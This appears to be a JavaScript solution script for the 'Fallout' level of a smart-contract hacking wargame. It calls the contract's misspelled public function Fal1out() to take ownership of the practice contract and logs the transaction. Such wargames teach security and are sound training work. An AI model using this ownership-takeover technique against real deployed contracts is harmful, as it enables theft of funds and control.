const {BLOCK_EXPLORER_URL, FALLOUT_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Fallout level');

    if (!FALLOUT_INSTANCE_ADDRESS) {
        console.log('Fallout instance address not found');
        return;
    }

    console.log('Fallout instance address', FALLOUT_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Fallout");
    const contract = factory.attach(FALLOUT_INSTANCE_ADDRESS);

    const tx = await contract.Fal1out();
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Fallout level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
